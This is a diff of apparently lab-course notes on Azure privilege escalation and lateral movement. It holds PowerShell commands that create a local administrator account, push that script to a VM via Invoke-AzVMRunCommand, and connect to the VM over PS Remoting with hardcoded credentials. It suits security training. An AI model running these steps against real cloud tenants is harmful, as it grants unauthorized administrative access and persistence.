@@ -28,7 +28,7 @@ Privilege Escalation and Lateral Movement
   - [enum Role Assignments (automation groups)](https://github.com/conma293/Azure/blob/main/killcycle.md#enumerate-resources-ie-role-assignments-for-automation-account)
   - [Create runbook](https://github.com/conma293/Azure/blob/main/killcycle.md#create-runbook)
 - [RunCommand](https://github.com/conma293/Azure/blob/main/killcycle.md#run-command)
-  - [Add user to VM](
+  - [Add user to VM](https://github.com/conma293/Azure/blob/main/killcycle.md#run-a-script)
   - [Get public IP](
   - [Connect to VM](
 * * *
@@ -762,15 +762,14 @@ On the listener, you should see a connect back and we can execute commands!
 #### Run a script 
 A powershell script to add users below:
 ```
-$passwd = ConvertTo-SecureString "StudXPassword@123" -AsPlainText -Force
-New-LocalUser -Name studentX -Password $passwd
-Add-LocalGroupMember -Group Administrators -Member studentx
+$passwd = ConvertTo-SecureString "Stud213Password@123" -AsPlainText -Force
+New-LocalUser -Name student213 -Password $passwd
+Add-LocalGroupMember -Group Administrators -Member student213
 ```
 Now we can run the script via VMRumCommand:
 ```
 Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
 ```
-
 
 #### Get Public IP
 ```
@@ -785,8 +784,8 @@ Get-AzPublicIpAddress -Name bkpadconnectIP
 #### Connect to VM
 Now we are a user on the VM and we know the publically addressable IP, we can connect directly to it using PS Remoting
 ```
-$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential('studentx', $Password) 
+$password = ConvertTo-SecureString 'Stud213Password@123' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('student213', $Password) 
 $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
 Enter-PSSession $sess
 ```
